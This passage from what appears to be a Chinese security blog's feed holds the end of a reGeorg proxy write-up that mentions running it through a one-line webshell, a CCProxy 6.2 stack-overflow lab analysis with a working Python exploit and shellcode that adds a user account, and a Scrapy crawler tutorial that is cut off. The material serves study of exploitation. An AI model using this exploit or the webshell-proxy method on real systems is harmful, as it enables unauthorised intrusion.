总结</strong></h2><p>其实看完代码，就可以发现整个过程其实并没有远端代理服务器访问外网的成分，另外其实我们可以发现，远端的代理服务器实际上就是一个中转数据的 api</p><h2 id="0X04-补充"><a href="#0X04-补充" class="headerlink" title="0X04 补充"></a><strong>0X04 补充</strong></h2><p>文章开头说了我们这里是用 php 的nosocket 版本进行的分析，对于可以使用 socket 的情况，远端的代理服务器就是作为 socket 的客户端向内网服务器发送 socket 请求，然后直接获取数据</p><h2 id="0X04-扩展"><a href="#0X04-扩展" class="headerlink" title="0X04 扩展"></a><strong>0X04 扩展</strong></h2><p>虽然不需要访问外网就能实现代理功能，但是毕竟文件比较大，上传上去还是比较明显，那么有没有更加优雅的方法呢？有的， LCTF 2018 中 zsx 师傅，将这款工具的 php 部分进行了修改，实现了只要远端有一个 一句话木马就能直接运行(实际上本质就是将这个代理脚本作为数据传到小马里面 eval，其他语言的部分其实可以根据自己所需进行修改如下图)</p><p>这是读取代理脚本到变量</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B13.jpg" alt="此处输入图片的描述"></p><p>这里是将变量作为参数传入一句话</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B14.jpg" alt="此处输入图片的描述"></p><p>项目地址：<a href="https://github.com/zsxsoft/reGeorg">https://github.com/zsxsoft/reGeorg</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCProxy6.2 栈溢出分析</title>
    <link href="/2019/06/13/CCProxy6.2%20%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <url>/2019/06/13/CCProxy6.2%20%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近看了点二进制的东西，正好学校里面有栈溢出的实验，就简单拿出来分析一下，CCPorxy 6.2 ,一个比较经典的 windows 下的栈溢出，因为是非常老的软件，而且我选择在 windows xp 中运行，因此这里并不涉及保护的问题，只是简单的分析一下。</p><h2 id="0X01-先简单说一下溢出点"><a href="#0X01-先简单说一下溢出点" class="headerlink" title="0X01 先简单说一下溢出点"></a><strong>0X01 先简单说一下溢出点</strong></h2><p>该软件双击运行以后，可以在本机 telnet 127.0.0.1 ,然后再去 ping 一个 ip 地址，我们的栈溢出的点就在这个 ping 后面的地址上</p><p>当我们 Ping 正常地址的时候，以及 ping 一个不存在的地址的时候的反应是不同的，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA1.png" alt="此处输入图片的描述"></p><span id="more"></span><p>当我们 ping 一个超长的(我这里选择的是 2000 个 A)不存在的地址的字符串的时候，程序会直接崩溃，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA2.png" alt="此处输入图片的描述"></p><p>说明程序在处理超长地址的时候出现了字符越界的问题，下面我们就用 IDA 静态分析一下</p><h2 id="0X02-IDA-静态分析程序"><a href="#0X02-IDA-静态分析程序" class="headerlink" title="0X02 IDA 静态分析程序"></a><strong>0X02 IDA 静态分析程序</strong></h2><p>首先等待 ida 将程序装载完整，为了快速定位我们首先打开 string 窗口，对我们可能的溢出点进行搜索，特征就是 “Host not found…” 这个字符串</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA3.png" alt="此处输入图片的描述"></p><p>进入以后我们查看这个函数的交叉引用，定位到调用函数的位置</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA4.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA5.png" alt="此处输入图片的描述"></p><p>我们使用 F5 看一下源码，可以看到，我们的主机传进去就是 name ,然后我们会将其赋值到 buf 的缓冲区空间，然后造成了溢出</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA6.png" alt="此处输入图片的描述"></p><p>我们回过头看一下这个函数的调用情况</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA7.png" alt="此处输入图片的描述"></p><p>仔细观察他的 ebp 和 esp 的入站情况我们发现，这个程序的设计是不同寻常的，因为，我们往往的函数调用约定是先 push ebp 然后 mov ebp，esp 的,但这里直接先把 esp 提了上去，而 ebp 的位置是由 ecx 决定的，ecx 在前面又经过了非常多的转化，这就让我们通过 ebp 作为基址产生了困难，而且我们也发现上面很多的寻址都是通过 esp 作为基址的，于是这里我们转而使用 esp 作为我们定位 buf 位置的基址</p><p>我们还是使用 F5 看一下 Buf 相对于esp 的偏移</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA8.png" alt="此处输入图片的描述"></p><p>可以看到是  esp+3Ch， 也就是 esp 下面 60 字节的位置，于是我们就很容易的计算出我们的溢出的偏移为 1012 字节。</p><p>有了偏移量，我们下一步要考虑的就是将我们的返回地址覆盖成什么，我的想法首先是覆盖成 shellcode 的地址，但是我们知道栈的空间是不确定的，我们没法确定栈每次都是在那个位置，于是我们还有一种经典的方式是将返回地址覆盖成 jmp esp 的地址，然后让其执行 jmp esp 这条指令。</p><h2 id="0X02-jmp-esp-地址的获取"><a href="#0X02-jmp-esp-地址的获取" class="headerlink" title="0X02 jmp esp 地址的获取"></a><strong>0X02 jmp esp 地址的获取</strong></h2><p>jmp esp 可以看成是一个跳板，在很多程序自带的函数库中都有很多的 jmp esp 的地址，因为这是一个图形化程序，必然自带了 user32.dll ，于是我们可以写程序在 user32.dll 中寻找 Jmp esp 的地址，然后随机选择一个来覆盖我们的返回值</p><p><strong>代码如下：</strong></p><p><strong>search_opcode.c</strong></p><pre><code class="hljs">//FF E0JMP EAX//FF E1JMP ECX//FF E2JMP EDX//FF E3JMP EBX//FF E4JMP ESP//FF E5JMP EBP//FF E6JMP ESI//FF E7JMP EDI//FF D0CALL EAX//FF D1CALL ECX//FF D2CALL EDX//FF D3CALL EBX//FF D4CALL ESP//FF D5CALL EBP//FF D6CALL ESI//FF D7CALL EDI#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define DLL_NAME &quot;user32.dll&quot;main()&#123;BYTE* ptr;int position,address;HINSTANCE handle;BOOL done_flag = FALSE;handle=LoadLibrary(DLL_NAME);if(!handle)&#123;printf(&quot; load dll erro !&quot;);exit(0);&#125;ptr = (BYTE*)handle;for(position = 0; !done_flag; position++)&#123;try&#123;if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)&#123;//0xFFE4 is the opcode of jmp espint address = (int)ptr + position;printf(&quot;OPCODE found at 0x%x\n&quot;,address);&#125;&#125;catch(...)&#123;int address = (int)ptr + position;printf(&quot;END OF 0x%x\n&quot;, address);done_flag = true;&#125;&#125;&#125;</code></pre><p>通过这个程序的运行，我们能找到很多的 jmp esp 的地址，我这里选择的是最后一个</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA9.png" alt="此处输入图片的描述"></p><h2 id="0X03-exp-py"><a href="#0X03-exp-py" class="headerlink" title="0X03 exp.py"></a><strong>0X03 exp.py</strong></h2><p>接下来就是编写 shellcode ，并且构造我们的 exp 来实现执行命令的操作了</p><pre><code class="hljs">import socketimport ossock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)sock.connect((&#39;192.168.43.35&#39;,23))  s = sock.recv(4096)  p =b&#39;ping &#39; + b&#39;\x90&#39;*4                       jmp = b&#39;\xE9\x03\xFC\xFF\xFF\x90\x90\x90&#39; # 这里最后会布置到 esp+0xC 的地址，跳转到我们上面的 shellcode      shellcode= b&#39;\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&#39;  junk = b&#39;a&#39;*920                    jmpesp = b&#39;\x79\x5b\xe3\x77&#39;            #jump esp 的地址,是从user32.dll中获取的p = p+jmp+shellcode+junk+jmpesp+b&#39;\x90&#39;*16       sock.send(p)                        sock.send(b&#39;\n&#39;)s = sock.recv(4096)print(s)</code></pre><h2 id="0X04-OD-的动态调试"><a href="#0X04-OD-的动态调试" class="headerlink" title="0X04 OD 的动态调试"></a><strong>0X04 OD 的动态调试</strong></h2><p>因为 exp 并不是我写的，我只是简单地修改了一下原始的 exp ，所以我还是要对其进行一些分析，于是我选择使用动态调试工具 OD ，在 exp 打入以后进行单步跟踪调试</p><p>首先在函数拷贝结束以后下断点，找到这个地址的方式是通过 ida 的静态分析获取的 sprintf 的地址，然后直接在 OD 中定位的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA10.png" alt="此处输入图片的描述"></p><p>然后 F9 运行，然后直接打 exp ，然后运行到即将返回的时候的状态，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA11.png" alt="此处输入图片的描述"></p><p>首先我们要关注到 retn 0xC ，这说明在执行完这条指令的时候 esp 不只是会向高地址移动 4 字节，还会再继续向高地址移动 0xC 个字节，然后我们再来看右下角的栈区，我们发现此时 esp 移动后指向的是 0xFFFC03E9 ,这个刚好是我们 exp 中的 jmp 变量的值，并且这是一个负数，也就是一个相对的向低地址跳转的指令，也就是说虽然我们在 exp 中看似 jmp 在 shellcode 前面，但是实际上到了栈空间以后还是有所变化的</p><p>然后我们调到 jmp esp 的地址 ，执行 jmp esp </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA12.png" alt="此处输入图片的描述"></p><p>我们看到正如我们上面分析的，我们的 esp 已经跑到了 0xFFFC03E9 ,我们继续往下执行</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA13.png" alt="此处输入图片的描述"></p><p>此时相对地址已经被计算成为绝对地址，然后我们下一步就会跳转到我们的 shellcode </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA14.png" alt="此处输入图片的描述"></p><p>该条指令的作用就是想计算机中添加一个名为 a 的用户</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA15.png" alt="此处输入图片的描述"></p><h2 id="0X05-补充分析"><a href="#0X05-补充分析" class="headerlink" title="0X05 补充分析"></a><strong>0X05 补充分析</strong></h2><p>计算偏移除了之前使用的 用 ida 去计算以外，我们还能使用随机字符串定位法去计算，我们首先生成比如 2000 个随机字符</p><p><strong>rand.py</strong></p><pre><code class="hljs">import randomrandom_str = &#39;&#39;base_str = &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;length = len(base_str) - 1for i in range(5000):    random_str += base_str[random.randint(0, length)]print(random_str)</code></pre><p>然后我们将其打入程序，使用 OD 单步调试直到返回地址，我们会看到返回地址被哪四个字符淹没了，然后我们再去整个字符串中找那四个字符的位置</p><p><strong>find.py</strong></p><pre><code class="hljs">ori_str1 = &#39;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&#39;find_str = &#39;aBZ0&#39;print(ori_str1.find(find_str))</code></pre><p>也可以算出来是 1012 字节</p><h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>这个程序被奉为是比较经典的 windows 栈溢出实例，仔细分析以后能比较好的理解栈溢出的全过程，至于 shellcode 的书写，我们当然也可以用汇编自己写，然后使用 OD 导出来字节码，但是由于这个程序有一些奇怪的机制，使得 opcode 的写入顺序和实际顺序不太一样，就比较难写，我猜测可能是内部做了什么保护机制？不太明白，还需要继续努力。</p>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制 栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3 爬虫知识梳理(框架篇)</title>
    <link href="/2019/05/10/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E6%A1%86%E6%9E%B6%E7%AF%87)/"/>
    <url>/2019/05/10/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E6%A1%86%E6%9E%B6%E7%AF%87)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-scrapy-的安装与使用"><a href="#0X00-scrapy-的安装与使用" class="headerlink" title="0X00 scrapy 的安装与使用"></a><strong>0X00 scrapy 的安装与使用</strong></h2><h3 id="1-windows-下-scrapy-的安装"><a href="#1-windows-下-scrapy-的安装" class="headerlink" title="1.windows 下 scrapy 的安装"></a><strong>1.windows 下 scrapy 的安装</strong></h3><p>windows 下的安装首先需要安装一些依赖库，有些最好使用下载 whl 文件进行本地安装的方法，下面是安装步骤和一些需要本地安装的依赖库</p><p><strong>1.wheel</strong></p><pre><code class="hljs">pip3 install wheel</code></pre><p><strong>2.lxml</strong></p><pre><code class="hljs">http://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml</code></pre><p><strong>3.PyOpenssl</strong></p><pre><code class="hljs">https://pypi.python.org/pypi/pyOpenSSL#downloads</code></pre><p><strong>4.Twisted</strong></p><pre><code class="hljs">http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</code></pre><p><strong>5.Pywin32</strong></p><pre><code class="hljs">https://pypi.org/project/pywin32/#files</code></pre><p><strong>6.Scrapy</strong> </p><pre><code class="hljs">pip3 install scrapy</code></pre><h3 id="2-scrapy-的基本运行测试"><a href="#2-scrapy-的基本运行测试" class="headerlink" title="2.scrapy 的基本运行测试"></a><strong>2.scrapy 的基本运行测试</strong></h3><p>按照下图的步骤输入，如果最后没有报错就说明安装成功</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%871.png" alt="此处输入图片的描述"></p><span id="more"></span><h3 id="3-补充：anaconda-下的-scrapy-的安装"><a href="#3-补充：anaconda-下的-scrapy-的安装" class="headerlink" title="3.补充：anaconda 下的 scrapy 的安装"></a><strong>3.补充：anaconda 下的 scrapy 的安装</strong></h3><p>如果 windows 本地安装有 anaconda 集成环境的话那么安装 scrapy 是极其简单的，只需要下面一条命令就可以了</p><pre><code class="hljs">conda install scarpy</code></pre><h2 id="0X01-Scrapy框架基本使用"><a href="#0X01-Scrapy框架基本使用" class="headerlink" title="0X01 Scrapy框架基本使用"></a><strong>0X01 Scrapy框架基本使用</strong></h2><p>本节主要是对一个实例网站进行抓取，然后顺带介绍一下 Scrapy 框架的使用，我们的实例网站是 <a href="http://quotes.toscrape.com/%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AE%98%E6%96%B9%E6%8F%90%E4%BE%9B%E7%9A%84%E5%AE%9E%E4%BE%8B%E7%BD%91%E7%AB%99%EF%BC%8C%E6%AF%94%E8%BE%83%E7%BB%8F%E5%85%B8">http://quotes.toscrape.com/，这是一个官方提供的实例网站，比较经典</a></p><h3 id="1-分析页面确定爬取思路"><a href="#1-分析页面确定爬取思路" class="headerlink" title="1.分析页面确定爬取思路"></a><strong>1.分析页面确定爬取思路</strong></h3><p>我们要抓取的页面很简单如下所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%872_.png" alt="此处输入图片的描述"></p><p>首先页面没有使用任何的动态加载的技术，我们能够使用正则直接匹配，另外我们翻页也能够使用改变 url 的 offset 来实现</p><p><strong>思路梳理：</strong></p><p>(1)请求第一页得到源代码进行下一步分析<br>(2)获取首页内容并改变 URL 链接准备下一页的请求<br>(3)获取下一页源代码<br>(4)将结果保存为文件格式或者存储进数据库</p><h4 id="3-scrapy-的初次使用"><a href="#3-scrapy-的初次使用" class="headerlink" title="3.scrapy 的初次使用"></a><strong>3.scrapy 的初次使用</strong></h4><p><strong>创建项目</strong></p><pre><code class="hljs">&gt;&gt;scrapy startproject quotetutorial&gt;&gt;cd quotetutorial&gt;&gt;scrapy genspider quotes quotes.toscrape.com</code></pre><p><strong>使用 pycharm 打开项目</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%873.png" alt="此处输入图片的描述"></p><p><strong>定义存储结构</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%874.png" alt="此处输入图片的描述"></p><p><strong>编写页面解析函数</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%876.png" alt="此处输入图片的描述"></p><p><strong>使用 scrpay shell 进行交互测试</strong></p><pre><code class="hljs">&gt;&gt;scrapy shell quotes.toscrape.com </code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%875.png" alt="此处输入图片的描述"></p><p><strong>运行我们的“简陋”的爬虫</strong></p><pre><code class="hljs">&gt;&gt;scrapy crawl quotes</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%877.png" alt="此处输入图片的描述"></p><p>我们可以看到我们想要抓取的第一页的结果已经大致上输出了</p><p><strong>完善我们的爬虫实现每一页的抓取</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%878.png" alt="此处输入图片的描述"></p><p><strong>将我们爬取到的数据保存</strong></p><pre><code class="hljs">&gt;&gt;scrapy crawl quotes -o quotes.json</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%879.png" alt="此处输入图片的描述"></p><p>除了能保存成 json 后缀的文件以外，我们还能保存成 jl(jsonline，每一行都是一条 json )，或者是 csv 格式，再或者是 xml 格式等，甚至还支持保存到远程 ftp 服务器的形式 </p><pre><code class="hljs">-o ftp://user:pass@ftp.example.com/path/quotes.json</code></pre><p><strong>对获取到的数据进行其他的处理</strong></p><p>如果有一些 item 是我们不想要的，或者是我们想把 item 保存到数据库的话，上面的方法似乎就不是那么适用了，我们就要借助于 scrapy 给我们提供的另一个组件 pipelines.py 帮我们实现</p><p>比如我们现在有这样的需求，我们想把名言超出我们规定的长度的部分删除，并且加上三个省略号</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8710.png" alt="此处输入图片的描述"></p><p>另外我们如果还想存储进数据库的话，我们还要自己写一个 pipeline </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8711.png" alt="此处输入图片的描述"></p><p>数据库的设置我们需要在 settings.py 中添加配置项</p><pre><code class="hljs">MONGO_URL = &#39;localhost&#39;MONGO_DB = &#39;quotes&#39;</code></pre><p>然后是我们需要在 settings.py 中开启启动 pipeline 的选项，使我们的配置生效</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8712.png" alt="此处输入图片的描述"></p><h4 id="2-最终代码实现"><a href="#2-最终代码实现" class="headerlink" title="2.最终代码实现"></a><strong>2.最终代码实现</strong></h4><p><strong>quotes.py</strong> </p><pre><code class="hljs">import...class QuotesSpider(scrapy.Spider):    name = &#39;quotes&#39;    allowed_domains = [&#39;quotes.toscrape.com&#39;]    start_urls = [&#39;http://quotes.toscrape.com/&#39;]    def parse(self, response):        quotes = response.css(&#39;.quote&#39;)        for quote in quotes:            #定义接收对象item            item = QuotetutorialItem()            text = quote.css(&#39;.text::text&#39;).extract_first()            author = quote.css(&#39;.author::text&#39;).extract_first()            tags = quote.css(&#39;.tags .tag::text&#39;).extract()            item[&#39;text&#39;] = text            item[&#39;author&#39;] = author            item[&#39;tags&#39;] = tags            yield item        next = response.css(&#39;.pager .next a::attr(href)&#39;).extract_first()        #拼接下一页的 URL        url = response.urljoin(next)        #使用 scrapy.Request 递归的调用自己实现爬取下一页        yield scrapy.Request(url=url,callback=self.parse)</code></pre><p><strong>items.py</strong></p><pre><code class="hljs">import...class QuotetutorialItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    text = scrapy.Field()    author = scrapy.Field()    tags = scrapy.Field()</code></pre><p><strong>pipelines.py</strong></p><pre><code class="hljs">import...#这个类相当于是返回结果的拦截器class QuotetutorialPipeline(object):    def __init__(self):        self.limit = 50    def process_item(self, item, spider):        if item[&#39;text&#39;]:            if len(item[&#39;text&#39;]) &gt;  self.limit:                item[&#39;text&#39;] = item[&#39;text&#39;][:self.limit].rstrip() + &#39;...&#39;            return item        else:            # scrapy 特殊的错误处理函数            return DropItem(&#39;Missing Text&#39;)class MongoPipeline(object):    def __init__(self,mongo_url,mongo_db):        self.mongo_url = mongo_url        self.mongo_db = mongo_db    #这个内置函数能从 settings 里面拿到想要的配置信息    @classmethod    def from_crawler(cls,crawler):        return cls(            mongo_url = crawler.settings.get(&#39;MONGO_URL&#39;),            mongo_db = crawler.settings.get(&#39;MONGO_DB&#39;)        )    #这个方法是爬虫初始化的时候会执行的方法    def open_spider(self,spider):        self.client = pymongo.MongoClient(self.mongo_url)        self.db = self.client[self.mongo_db]    #重写该方法实现对数据的数据库存储    def process_item(self,item,spider):        name = item.__class__.__name__        self.db[name].insert(dict(item))        return item    def close_spider(self,spider):        self.client.close()</code></pre><h4 id="3-最终运行效果"><a href="#3-最终运行效果" class="headerlink" title="3.最终运行效果"></a><strong>3.最终运行效果</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8713.png" alt="此处输入图片的描述"></p><h2 id="0X02-scrapy-命令行详解"><a href="#0X02-scrapy-命令行详解" class="headerlink" title="0X02 scrapy 命令行详解"></a><strong>0X02 scrapy 命令行详解</strong></h2><p>这里仅仅说一些我上面没有提到过的，至于上面已经说过的关于项目的创建以及我们的项目的运行我这里就不再赘述</p><h3 id="1-genspider-选择生成的爬虫对象的模式"><a href="#1-genspider-选择生成的爬虫对象的模式" class="headerlink" title="1.genspider 选择生成的爬虫对象的模式"></a><strong>1.genspider 选择生成的爬虫对象的模式</strong></h3><p>scrapy 在生成爬虫对象的时候可以选择生成的模式，不同的模式会生成不同的爬虫模板，模式的选择如下</p><pre><code class="hljs">λ scrapy genspider -lAvailable templates:  basic  crawl  csvfeed  xmlfeed    λ scrapy genspider -t crawl zhihu www.zhihu.comCreated spider &#39;zhihu&#39; using template &#39;crawl&#39; in module:  testpro.spiders.zhihu</code></pre><h3 id="2-check-检查代码的正确性"><a href="#2-check-检查代码的正确性" class="headerlink" title="2.check 检查代码的正确性"></a><strong>2.check 检查代码的正确性</strong></h3><pre><code class="hljs">λ scrapy check----------------------------------------------------------------------Ran 0 contracts in 0.000sOK</code></pre><h3 id="3-list-返回项目中所有的-spider-的名称"><a href="#3-list-返回项目中所有的-spider-的名称" class="headerlink" title="3.list 返回项目中所有的 spider 的名称"></a><strong>3.list 返回项目中所有的 spider 的名称</strong></h3><pre><code class="hljs">λ scrapy listzhihu</code></pre><h3 id="4-fecth-快速获取网页返回结果"><a href="#4-fecth-快速获取网页返回结果" class="headerlink" title="4.fecth 快速获取网页返回结果"></a><strong>4.fecth 快速获取网页返回结果</strong></h3><p><strong>基本请求</strong></p><pre><code class="hljs">λ scrapy fetch http://www.baidu.com</code></pre><p><strong>不需要日志信息</strong></p><pre><code class="hljs">λ scrapy fetch --nolog http://www.baidu.com</code></pre><p><strong>返回响应头</strong></p><pre><code class="hljs">λ scrapy fetch --nolog  --headers http://www.baidu.com</code></pre><p><strong>拒绝重定向</strong></p><pre><code class="hljs">λ scrapy fetch --nolog  --no-redirect http://www.baidu.com</code></pre><h3 id="5-view-使用浏览器快速查看响应"><a href="#5-view-使用浏览器快速查看响应" class="headerlink" title="5.view 使用浏览器快速查看响应"></a><strong>5.view 使用浏览器快速查看响应</strong></h3><pre><code class="hljs">λ scrapy view http://www.baidu.com</code></pre><blockquote><p><strong>注意：</strong></p><p>这里浏览器打开的是 dump 